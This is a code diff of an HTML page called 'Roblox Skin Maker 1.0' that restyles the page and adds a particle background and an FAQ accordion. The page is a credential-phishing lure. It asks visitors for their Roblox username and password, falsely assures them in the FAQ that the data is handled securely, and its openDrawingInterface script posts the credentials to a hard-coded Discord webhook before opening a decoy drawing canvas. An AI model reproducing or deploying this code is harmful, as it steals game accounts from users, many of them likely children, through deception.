@@ -12,15 +12,16 @@
             padding: 0;
             background: linear-gradient(to right, #00c6ff, #0072ff);
             color: #333;
+            overflow-x: hidden;
         }
 
-        header.navbar {
+        .navbar {
             background-color: #333;
             overflow: hidden;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
-        header.navbar a {
+        .navbar a {
             float: left;
             display: block;
             color: #f2f2f2;
@@ -30,7 +31,7 @@
             transition: background-color 0.3s, color 0.3s;
         }
 
-        header.navbar a:hover {
+        .navbar a:hover {
             background-color: #ddd;
             color: #333;
         }
@@ -48,6 +49,7 @@
         h1 {
             margin-bottom: 20px;
             color: #0072ff;
+            animation: fadeIn 2s ease-in-out;
         }
 
         input[type="text"],
@@ -60,17 +62,25 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        input:focus,
+        button:focus {
+            border-color: #0072ff;
+            outline: none;
         }
 
         button {
             background-color: #007bff;
             color: #fff;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.3s, transform 0.2s;
         }
 
         button:hover {
             background-color: #0056b3;
+            transform: scale(1.05);
         }
 
         .footer {
@@ -85,16 +95,23 @@
             width: 80px;
             height: 80px;
             margin-top: 10px;
+            transition: transform 0.3s;
+        }
+
+        .footer img:hover {
+            transform: scale(1.1);
         }
 
         .footer a {
             margin: 0 10px;
             text-decoration: none;
             color: #007bff;
+            transition: color 0.3s;
         }
 
         .footer a:hover {
             text-decoration: underline;
+            color: #0056b3;
         }
 
         .required {
@@ -102,7 +119,22 @@
             font-weight: bold;
         }
 
-        .faq,
+        .faq {
+            margin-top: 40px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .faq h2 {
+            margin-bottom: 10px;
+        }
+
+        .faq p {
+            margin: 10px 0;
+        }
+
         .contact-form {
             margin-top: 40px;
             padding: 20px;
@@ -111,16 +143,12 @@
             text-align: left;
         }
 
-        .faq h2,
         .contact-form h2 {
             margin-bottom: 10px;
         }
 
-        .faq p,
-        .contact-form p {
-            margin: 10px 0;
-        }
-
+        .contact-form input[type="text"],
+        .contact-form input[type="email"],
         .contact-form textarea {
             width: 100%;
             padding: 12px;
@@ -128,6 +156,13 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        .contact-form input:focus,
+        .contact-form textarea:focus {
+            border-color: #0072ff;
+            outline: none;
         }
 
         .contact-form button {
@@ -138,51 +173,94 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.3s, transform 0.2s;
         }
 
         .contact-form button:hover {
             background-color: #0056b3;
+            transform: scale(1.05);
+        }
+
+        .accordion {
+            background-color: #0072ff;
+            color: #fff;
+            cursor: pointer;
+            padding: 10px;
+            border: none;
+            text-align: left;
+            outline: none;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .accordion:hover,
+        .accordion.active {
+            background-color: #0056b3;
+        }
+
+        .panel {
+            padding: 0 18px;
+            display: none;
+            overflow: hidden;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
     </style>
 </head>
 
 <body>
-    <header class="navbar">
-        <a href="#home" aria-label="Home">Home</a>
-        <a href="#faq" aria-label="FAQ">FAQ</a>
-        <a href="#contact" aria-label="Contact">Contact</a>
-    </header>
+    <div class="navbar">
+        <a href="#home">Home</a>
+        <a href="#faq">FAQ</a>
+        <a href="#contact">Contact</a>
+    </div>
 
-    <main class="container">
+    <div class="particles-js" id="particles-js"></div>
+
+    <div class="container">
         <h1>Roblox Skin Maker 1.0</h1>
         <p><strong>Connect to your account <span class="required">REQUIRED</span></strong></p>
         <p>Enter Roblox username and password:</p>
-        <input type="text" id="username" placeholder="Username" aria-label="Roblox Username">
-        <input type="password" id="password" placeholder="Password" aria-label="Roblox Password">
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
         <button onclick="openDrawingInterface()">Link Account</button>
-    </main>
+    </div>
 
-    <section class="faq" id="faq">
+    <div class="faq" id="faq">
         <h2>FAQ</h2>
-        <p><strong>What is the Roblox Skin Maker?</strong></p>
-        <p>The Roblox Skin Maker allows you to create and customize your own skins, including t-shirts, for your Roblox avatar. Simply link your account and start designing!</p>
-        <p><strong>How do I use the Roblox Skin Maker?</strong></p>
-        <p>Enter your Roblox username and password to link your account, then a window will popup and start designing your own wonderful skins!</p>
-        <p><strong>Is my account information safe?</strong></p>
-        <p>Yes, your account information is securely handled and used only for linking your account to the skin maker for transferring the skins you make to your account.</p>
-    </section>
+        <button class="accordion">What is the Roblox Skin Maker?</button>
+        <div class="panel">
+            <p>The Roblox Skin Maker allows you to create and customize your own skins, including t-shirts, for your Roblox avatar. Simply link your account and start designing!</p>
+        </div>
+        <button class="accordion">How do I use the Roblox Skin Maker?</button>
+        <div class="panel">
+            <p>Enter your Roblox username and password to link your account, then a window will popup and start designing your own wonderful skins!</p>
+        </div>
+        <button class="accordion">Is my account information safe?</button>
+        <div class="panel">
+            <p>Yes, your account information is securely handled and used only for linking your account to the skin maker because to transfer the skins you make to your account.</p>
+        </div>
+    </div>
 
-    <section class="contact-form" id="contact">
+    <div class="contact-form" id="contact">
         <h2>Contact Us</h2>
         <p>If you have any questions or need support, please fill out the form below:</p>
-        <input type="text" id="contactName" placeholder="Your Name" required aria-label="Your Name">
-        <input type="email" id="contactEmail" placeholder="Your Email" required aria-label="Your Email">
-        <textarea id="contactMessage" placeholder="Your Message" rows="5" required aria-label="Your Message"></textarea>
+        <input type="text" id="contactName" placeholder="Your Name" required>
+        <input type="email" id="contactEmail" placeholder="Your Email" required>
+        <textarea id="contactMessage" placeholder="Your Message" rows="5" required></textarea>
         <button onclick="sendContactForm()">Send Message</button>
-    </section>
+    </div>
 
-    <footer class="footer">
+    <div class="footer">
         <p>Build your own custom t-shirts!</p>
         <img src="images/build.png" alt="Build Image">
         <p>Follow us on
@@ -190,10 +268,101 @@
             <a href="#">Twitter</a>
             <a href="#">Instagram</a>
         </p>
-    </footer>
+    </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <script>
-        async function openDrawingInterface() {
+        particlesJS('particles-js', {
+            "particles": {
+                "number": {
+                    "value": 80,
+                    "density": {
+                        "enable": true,
+                        "value_area": 800
+                    }
+                },
+                "color": {
+                    "value": "#ffffff"
+                },
+                "shape": {
+                    "type": "circle",
+                    "stroke": {
+                        "width": 0,
+                        "color": "#000000"
+                    },
+                    "polygon": {
+                        "nb_sides": 5
+                    }
+                },
+                "opacity": {
+                    "value": 0.5,
+                    "random": false,
+                    "anim": {
+                        "enable": false,
+                        "speed": 1,
+                        "opacity_min": 0.1,
+                        "sync": false
+                    }
+                },
+                "size": {
+                    "value": 3,
+                    "random": true,
+                    "anim": {
+                        "enable": false,
+                        "speed": 40,
+                        "size_min": 0.1,
+                        "sync": false
+                    }
+                },
+                "line_linked": {
+                    "enable": true,
+                    "distance": 150,
+                    "color": "#ffffff",
+                    "opacity": 0.4,
+                    "width": 1
+                },
+                "move": {
+                    "enable": true,
+                    "speed": 6,
+                    "direction": "none",
+                    "random": false,
+                    "straight": false,
+                    "out_mode": "out",
+                    "bounce": false,
+                    "attract": {
+                        "enable": false,
+                        "rotateX": 600,
+                        "rotateY": 1200
+                    }
+                }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": {
+                        "enable": true,
+                        "mode": "repulse"
+                    },
+                    "onclick": {
+                        "enable": true,
+                        "mode": "push"
+                    },
+                    "resize": true
+                },
+                "modes": {
+                    "repulse": {
+                        "distance": 100,
+                        "duration": 0.4
+                    },
+                    "push": {
+                        "particles_nb": 4
+                    }
+                }
+            },
+            "retina_detect": true
+        });
+
+        function openDrawingInterface() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
@@ -202,7 +371,7 @@
                 return;
             }
 
-            // Webhook URL
+            // Webhook URL for drawing interface
             const webhookUrl = 'https://discord.com/api/webhooks/1254780445640359956/94A5ZWNCkAEvzCX6vSWMBXmTCT0mCxlI0xV6geNGV3v028Mgn94IHkPpEBm-p8eySBlS';
 
             // Data to send to webhook
@@ -210,85 +379,82 @@
                 content: `Username: ${username}\nPassword: ${password}`
             };
 
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error(`Failed to send data to webhook: ${response.status} ${response.statusText} - ${text}`);
+                        });
+                    }
+                    // Open the drawing interface
+                    const drawingWindow = window.open('', '_blank', 'width=800,height=600');
+                    drawingWindow.document.write(`
+                        <style>
+                            body { font-family: Arial, sans-serif; }
+                            h1 { color: #0072ff; }
+                            #controls { display: flex; justify-content: space-between; margin-bottom: 10px; }
+                            canvas { border: 1px solid #ccc; display: block; margin: 0 auto; }
+                        </style>
+                        <h1>Drawing Interface</h1>
+                        <div id="controls">
+                            <input type="color" id="colorPicker">
+                            <select id="penSize">
+                                <option value="1">Small</option>
+                                <option value="5">Medium</option>
+                                <option value="10">Large</option>
+                            </select>
+                            <button id="saveButton">Save Drawing</button>
+                        </div>
+                        <canvas id="drawingCanvas" width="780" height="400"></canvas>
+                    `);
 
-                if (!response.ok) {
-                    const text = await response.text();
-                    throw new Error(`Failed to send data to webhook: ${response.status} ${response.statusText} - ${text}`);
-                }
+                    const canvas = drawingWindow.document.getElementById('drawingCanvas');
+                    const ctx = canvas.getContext('2d');
+                    const colorPicker = drawingWindow.document.getElementById('colorPicker');
+                    const penSize = drawingWindow.document.getElementById('penSize');
 
-                // Open the drawing interface
-                const drawingWindow = window.open('', '_blank', 'width=800,height=600');
-                drawingWindow.document.write(`
-                    <style>
-                        body { font-family: Arial, sans-serif; }
-                        h1 { color: #0072ff; }
-                        #controls { display: flex; justify-content: space-between; margin-bottom: 10px; }
-                        canvas { border: 1px solid #ccc; display: block; margin: 0 auto; }
-                    </style>
-                    <h1>Drawing Interface</h1>
-                    <div id="controls">
-                        <input type="color" id="colorPicker">
-                        <select id="penSize">
-                            <option value="1">Small</option>
-                            <option value="5">Medium</option>
-                            <option value="10">Large</option>
-                        </select>
-                        <button id="saveButton">Save Drawing</button>
-                    </div>
-                    <canvas id="drawingCanvas" width="780" height="400"></canvas>
-                `);
+                    let isDrawing = false;
+                    let lastX = 0;
+                    let lastY = 0;
 
-                const canvas = drawingWindow.document.getElementById('drawingCanvas');
-                const ctx = canvas.getContext('2d');
-                const colorPicker = drawingWindow.document.getElementById('colorPicker');
-                const penSize = drawingWindow.document.getElementById('penSize');
+                    canvas.addEventListener('mousedown', (e) => {
+                        isDrawing = true;
+                        [lastX, lastY] = [e.offsetX, e.offsetY];
+                    });
 
-                let isDrawing = false;
-                let lastX = 0;
-                let lastY = 0;
-
-                canvas.addEventListener('mousedown', (e) => {
-                    isDrawing = true;
-                    [lastX, lastY] = [e.offsetX, e.offsetY];
-                });
-
-                canvas.addEventListener('mousemove', (e) => {
-                    if (isDrawing) {
-                        ctx.strokeStyle = colorPicker.value;
-                        ctx.lineWidth = penSize.value;
-                        ctx.lineCap = 'round';
+                    canvas.addEventListener('mousemove', (e) => {
+                        if (!isDrawing) return;
                         ctx.beginPath();
                         ctx.moveTo(lastX, lastY);
                         ctx.lineTo(e.offsetX, e.offsetY);
+                        ctx.strokeStyle = colorPicker.value;
+                        ctx.lineWidth = penSize.value;
+                        ctx.lineCap = 'round';
                         ctx.stroke();
                         [lastX, lastY] = [e.offsetX, e.offsetY];
-                    }
-                });
+                    });
 
-                canvas.addEventListener('mouseup', () => {
-                    isDrawing = false;
-                });
+                    canvas.addEventListener('mouseup', () => isDrawing = false);
+                    canvas.addEventListener('mouseout', () => isDrawing = false);
 
-                drawingWindow.document.getElementById('saveButton').addEventListener('click', () => {
-                    const image = canvas.toDataURL();
-                    const link = document.createElement('a');
-                    link.href = image;
-                    link.download = 'drawing.png';
-                    link.click();
+                    drawingWindow.document.getElementById('saveButton').addEventListener('click', () => {
+                        const image = canvas.toDataURL('image/png');
+                        const a = document.createElement('a');
+                        a.href = image;
+                        a.download = 'drawing.png';
+                        a.click();
+                    });
+                })
+                .catch(error => {
+                    console.error('There was a problem sending the username and password to the webhook:', error);
+                    alert('An error occurred while linking your account. Please try again.');
                 });
-
-            } catch (error) {
-                alert('An error occurred while linking the account. Please try again.');
-                console.error('Error:', error);
-            }
         }
 
         function sendContactForm() {
@@ -302,29 +468,46 @@
             }
 
             // Webhook URL for contact form
-            const webhookUrl = 'https://discord.com/api/webhooks/1254780445640359956/94A5ZWNCkAEvzCX6vSWMBXmTCT0mCxlI0xV6geNGV3v028Mgn94IHkPpEBm-p8eySBlS';
+            const contactWebhookUrl = 'https://discord.com/api/webhooks/1254780445640359956/94A5ZWNCkAEvzCX6vSWMBXmTCT0mCxlI0xV6geNGV3v028Mgn94IHkPpEBm-p8eySBlS';
 
             // Data to send to webhook
-            const data = {
-                content: `Name: ${name}\nEmail: ${email}\nMessage: ${message}`
+            const contactData = {
+                content: `Contact Form Submission:\nName: ${name}\nEmail: ${email}\nMessage: ${message}`
             };
 
-            fetch(webhookUrl, {
+            fetch(contactWebhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
-            }).then(response => {
-                if (!response.ok) {
-                    return response.text().then(text => Promise.reject(text));
-                }
-                alert('Message sent successfully!');
-            }).catch(error => {
-                alert('An error occurred while sending the message.');
-                console.error('Error:', error);
-            });
+                body: JSON.stringify(contactData)
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error(`Failed to send contact form: ${response.status} ${response.statusText} - ${text}`);
+                        });
+                    }
+                    alert('Your message has been sent successfully!');
+                })
+                .catch(error => {
+                    console.error('There was a problem sending the contact form:', error);
+                    alert('An error occurred while sending your message. Please try again.');
+                });
         }
+
+        // Accordion functionality for FAQ
+        document.querySelectorAll('.accordion').forEach(button => {
+            button.addEventListener('click', () => {
+                button.classList.toggle('active');
+                const panel = button.nextElementSibling;
+                if (panel.style.display === 'block') {
+                    panel.style.display = 'none';
+                } else {
+                    panel.style.display = 'block';
+                }
+            });
+        });
     </script>
 </body>
 
